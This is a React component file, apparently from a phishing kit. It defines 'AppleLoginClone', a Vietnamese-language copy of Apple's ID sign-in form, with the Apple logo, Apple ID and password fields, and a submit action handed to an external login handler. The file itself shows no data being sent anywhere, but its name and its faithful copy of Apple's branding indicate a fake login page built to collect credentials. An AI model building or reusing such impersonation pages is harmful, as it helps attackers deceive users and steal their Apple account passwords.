import React from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Loader, ArrowRight } from 'lucide-react';
import appleLogo from '@/assets/social/apple.svg';

const AppleLoginClone = ({ onLogin, isLoading }) => (
    <div className="bg-white p-8 rounded-lg text-black w-full text-center">
        <img src={appleLogo} alt="Apple" className="h-12 w-auto mx-auto mb-4" />
        <h2 className="text-2xl font-semibold">Đăng nhập bằng ID Apple</h2>
         <form onSubmit={onLogin} className="space-y-4 mt-6">
            <Input id="account" name="account" type="text" placeholder="ID Apple" required className="h-12 text-center text-black" disabled={isLoading} />
            <Input id="password" name="password" type="password" placeholder="Mật khẩu" required className="h-12 text-center text-black" disabled={isLoading} />
            <Button type="submit" className="w-12 h-12 rounded-full bg-gray-200 hover:bg-gray-300 text-black mx-auto" disabled={isLoading}>
                {isLoading ? <Loader className="h-5 w-5 animate-spin" /> : <ArrowRight className="h-5 w-5" />}
            </Button>
        </form>
         <button className="text-sm text-blue-600 hover:underline mt-4 block mx-auto">Quên ID Apple hoặc mật khẩu?</button>
    </div>
);

export default AppleLoginClone;